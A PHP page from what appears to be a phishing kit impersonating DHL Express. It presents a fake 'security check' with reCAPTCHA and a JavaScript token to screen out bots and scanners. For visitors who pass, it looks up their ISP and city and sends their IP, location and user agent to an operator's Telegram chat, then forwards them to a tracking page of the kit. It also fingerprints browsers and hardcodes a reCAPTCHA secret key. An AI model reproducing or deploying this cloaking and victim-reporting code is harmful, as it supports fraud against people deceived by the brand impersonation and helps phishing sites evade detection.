<?php
// Anti5: JavaScript Challenge
// Requires JavaScript execution to proceed

// No bypass system - full protection active

// Start output buffering to prevent header issues
ob_start();

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

$client_ip = $_SERVER['REMOTE_ADDR'] ?? '';
$js_token_key = 'js_verified_' . md5($client_ip);

function dhl_anti5_public_prefix() {
    $path = str_replace('\\', '/', $_SERVER['SCRIPT_NAME'] ?? '');
    $dir = dirname($path);
    if (preg_match('#/(pages|anti1)$#', $dir)) {
        $dir = dirname($dir);
    }
    return ($dir === '/' || $dir === '\\') ? '/' : rtrim($dir, '/') . '/';
}

function dhl_anti5_valid_flow_token($t) {
    return is_string($t) && $t !== ''
        && (strpos($t, 'SPT') === 0 || strpos($t, 'TKN') === 0)
        && strlen($t) >= 10;
}

function dhl_anti5_redirect_ok() {
    $token = (string) ($_SESSION['dhl_track_token'] ?? $_SESSION['token'] ?? '');
    $p = dhl_anti5_public_prefix();
    header('Location: ' . $p . 'pages/track.php?token=' . urlencode($token));
}

// Require ?token=SPT…|TKN… in URL (or session already set from index)
if (isset($_GET['token']) && dhl_anti5_valid_flow_token($_GET['token'])) {
    $_SESSION['dhl_track_token'] = $_GET['token'];
    $_SESSION['token'] = $_GET['token'];
}

// Always use anti5.php?token=… in the address bar (no “bare” anti5 without matching token)
$tok = (string) ($_SESSION['dhl_track_token'] ?? '');
if (dhl_anti5_valid_flow_token($tok)) {
    $getTok = isset($_GET['token']) ? (string) $_GET['token'] : '';
    if ($getTok !== $tok) {
        ob_end_clean();
        $sn = str_replace('\\', '/', $_SERVER['SCRIPT_NAME'] ?? '');
        header('Location: ' . $sn . '?token=' . rawurlencode($tok));
        exit;
    }
}

// Already passed reCAPTCHA — continue this request, or send standalone anti5.php visitors to track
if (isset($_SESSION[$js_token_key]) && $_SESSION[$js_token_key] === true && !empty($_SESSION['dhl_captcha_ok'])) {
    ob_end_clean();
    $entryScript = basename($_SERVER['SCRIPT_NAME'] ?? '');
    if ($entryScript === 'anti5.php') {
        dhl_anti5_redirect_ok();
        exit;
    }
    return;
}

if (empty($_SESSION['dhl_track_token'])) {
    ob_end_clean();
    header('Location: ' . dhl_anti5_public_prefix() . 'index.php');
    exit;
}

// Check for reCAPTCHA response
if (isset($_POST['g-recaptcha-response']) && !empty($_POST['g-recaptcha-response'])) {
    if (!empty($_POST['dhl_flow_token']) && dhl_anti5_valid_flow_token((string) $_POST['dhl_flow_token'])) {
        $_SESSION['dhl_track_token'] = $_POST['dhl_flow_token'];
        $_SESSION['token'] = $_POST['dhl_flow_token'];
    }

    $captcha = $_POST['g-recaptcha-response'];
    $secretKey = "6LffMGcUAAAAACw-0oBJ13czW1dsl_0HbXbxEVUY";
    $ip = $_SERVER['REMOTE_ADDR'];
    
    // Verify with Google
    $response = @file_get_contents("https://www.google.com/recaptcha/api/siteverify?secret=".$secretKey."&response=".$captcha."&remoteip=".$ip);
    $responseKeys = json_decode((string) $response, true);
    $captchaOk = is_array($responseKeys) && !empty($responseKeys['success']);

    if ($captchaOk) {
        $_SESSION[$js_token_key] = true;
        $_SESSION['anti_verified'] = true;
        $_SESSION['dhl_captcha_ok'] = true;

        require_once(__DIR__ . '/../config.php');
        require_once(__DIR__ . '/../includes/get-country.php');

        $country = getCountryFromIP($ip);
        $ipInfo = @json_decode(file_get_contents("http://ip-api.com/json/{$ip}"), true);
        $isp = $ipInfo['isp'] ?? 'Unknown';
        $city = $ipInfo['city'] ?? 'Unknown';
        $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        if (strlen($userAgent) > 100) {
            $userAgent = substr($userAgent, 0, 97) . '...';
        }
        $time = date('Y-m-d H:i:s T');

        $successMessage = "✅ REAL User Verified\n\n";
        $successMessage .= "🛰️ ISP: {$isp}\n";
        $successMessage .= "📡 IP Address: {$ip}\n";
        $successMessage .= "🌐 Country: {$country}\n";
        $successMessage .= "🌆 City: {$city}\n\n";
        $successMessage .= "🤖 User Agent: {$userAgent}\n";
        $successMessage .= "✅ Status: reCAPTCHA Passed\n";
        $successMessage .= "🕒 Time: {$time}\n\n";
        $successMessage .= "🛡️ DHL Express security";

        $botToken = TELEGRAM_BOT_TOKEN;
        $chatId = TELEGRAM_BOT_ALERTS_CHAT_ID;
        $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
        $data = ['chat_id' => $chatId, 'text' => $successMessage];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_exec($ch);
        curl_close($ch);

        $token = $_SESSION['dhl_track_token'] ?? '';
        if ($token === '') {
            $token = 'SPT' . strtoupper(substr(md5((string) time() . (string) rand() . uniqid('', true)), 0, 12));
            $_SESSION['dhl_track_token'] = $token;
        }
        $_SESSION['token'] = $token;
        $_SESSION['token_created'] = time();

        ob_end_clean();
        dhl_anti5_redirect_ok();
        exit();
    }
}

// Check for JS verification token in request
if (isset($_POST['js_token']) || isset($_GET['js_token'])) {
    $provided_token = $_POST['js_token'] ?? $_GET['js_token'];
    $expected_token = md5($client_ip . date('Y-m-d-H') . 'dhl_express_anti_bot_token');
    
    if ($provided_token === $expected_token) {
        $_SESSION[$js_token_key] = true;
        ob_end_clean();
        $sn = str_replace('\\', '/', $_SERVER['SCRIPT_NAME'] ?? '');
        $t = (string) ($_SESSION['dhl_track_token'] ?? '');
        if ($t !== '') {
            header('Location: ' . $sn . '?token=' . rawurlencode($t));
        } else {
            header('Location: ' . dhl_anti5_public_prefix() . 'index.php');
        }
        exit;
    }
}

// Stale state: JS challenge flag set but CAPTCHA not done (e.g. new visit from / after partial flow)
if (isset($_SESSION[$js_token_key]) && $_SESSION[$js_token_key] === true && empty($_SESSION['dhl_captcha_ok'])) {
    unset($_SESSION[$js_token_key]);
}

// If no valid token, serve JavaScript challenge
if (!isset($_SESSION[$js_token_key])) {
    $token = md5($client_ip . date('Y-m-d-H') . 'dhl_express_anti_bot_token');
    $flowTok = (string) ($_SESSION['dhl_track_token'] ?? '');
    $formAction = htmlspecialchars(str_replace('\\', '/', $_SERVER['SCRIPT_NAME'] ?? ''), ENT_QUOTES, 'UTF-8');
    $formActionWithTok = $formAction . '?token=' . rawurlencode($flowTok);

    // Load language for display
    $userLanguage = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'en', 0, 2);
    $supportedLanguages = ['en', 'es', 'fr', 'de', 'pt', 'th'];
    $selectedLanguage = in_array($userLanguage, $supportedLanguages) ? $userLanguage : 'en';
    $languageFile = __DIR__ . '/../languages/' . $selectedLanguage . '.php';
    $translations = file_exists($languageFile) ? include($languageFile) : include(__DIR__ . '/../languages/en.php');
    
    header('Content-Type: text/html; charset=UTF-8');
    echo '<!DOCTYPE html>
<html>
<head>
    <title>' . htmlspecialchars($translations['security_check_title']) . '</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://www.google.com/recaptcha/api.js?hl=' . $selectedLanguage . '" async defer></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: \'Circular\', -apple-system, BlinkMacSystemFont, \'Helvetica Neue\', Arial, sans-serif; 
            background-color: #121212;
            color: #fff; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            padding: 20px;
        }
        .container { 
            text-align: center; 
            max-width: 450px; 
            width: 100%;
            padding: 40px;
        }
        .dhl-captcha-logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 30px;
            background: #ffcc00;
            color: #d40511;
            font-weight: 900;
            font-size: 22px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 8px;
        }
        .progress-bar {
            width: 100%;
            height: 4px;
            background: #333;
            border-radius: 2px;
            margin: 20px 0;
            overflow: hidden;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #ffcc00, #d40511);
            width: 0%;
            border-radius: 2px;
            animation: progress 3s ease-in-out;
        }
        @keyframes progress {
            0% { width: 0%; }
            50% { width: 70%; }
            100% { width: 100%; }
        }
        .message {
            font-size: 18px;
            margin-bottom: 15px;
            color: #fff;
            font-weight: 600;
        }
        .sub-message {
            font-size: 14px;
            color: #a7a7a7;
            line-height: 1.6;
        }
        .dots {
            animation: blink 1.5s infinite;
        }
        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0; }
        }
        .captcha-container {
            margin-top: 30px;
            display: flex;
            justify-content: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="dhl-captcha-logo" aria-hidden="true">DHL</div>
        <div class="message">' . htmlspecialchars($translations['verifying_browser']) . '</div>
        <div class="progress-bar">
            <div class="progress-fill"></div>
        </div>
        <div class="sub-message">
            ' . htmlspecialchars($translations['please_wait_safe']) . '<span class="dots">...</span><br>
            <small>' . htmlspecialchars($translations['protect_automated']) . '</small>
        </div>
        
        <!-- Google reCAPTCHA -->
        <div class="captcha-container">
            <form method="POST" action="' . $formActionWithTok . '" id="captcha-form">
                <div class="g-recaptcha" data-sitekey="6LffMGcUAAAAABRJmPd1mUqhxUg7w5iktOIsbgMI" data-callback="onCaptchaSuccess"></div>
                <input type="hidden" name="js_token" value="' . htmlspecialchars($token, ENT_QUOTES, 'UTF-8') . '">
                <input type="hidden" name="dhl_flow_token" value="' . htmlspecialchars($flowTok, ENT_QUOTES, 'UTF-8') . '">
            </form>
        </div>
    </div>
    
    <script>
        // Enhanced JavaScript challenge with browser fingerprinting
        function verifyBrowser() {
            var token = "' . $token . '";
            
            // Basic browser capability checks
            var capabilities = {
                javascript: true,
                localStorage: typeof(Storage) !== "undefined",
                sessionStorage: typeof(sessionStorage) !== "undefined",
                webgl: !!window.WebGLRenderingContext,
                canvas: !!document.createElement("canvas").getContext,
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                cookieEnabled: navigator.cookieEnabled,
                onLine: navigator.onLine,
                screen: screen.width + "x" + screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
            
            var form = document.createElement("form");
            form.method = "POST";
            form.action = window.location.href;
            
            var tokenInput = document.createElement("input");
            tokenInput.type = "hidden";
            tokenInput.name = "js_token";
            tokenInput.value = token;
            
            var capInput = document.createElement("input");
            capInput.type = "hidden";
            capInput.name = "browser_capabilities";
            capInput.value = JSON.stringify(capabilities);
            
            form.appendChild(tokenInput);
            form.appendChild(capInput);
            document.body.appendChild(form);
            form.submit();
        }
        
        // Called when reCAPTCHA is solved
        function onCaptchaSuccess(token) {
            document.getElementById("captcha-form").submit();
        }
        
        // Add some mouse movement detection for enhanced security
        var mouseMovements = 0;
        document.addEventListener("mousemove", function() {
            mouseMovements++;
        });
    </script>
</body>
</html>';
    exit();
}
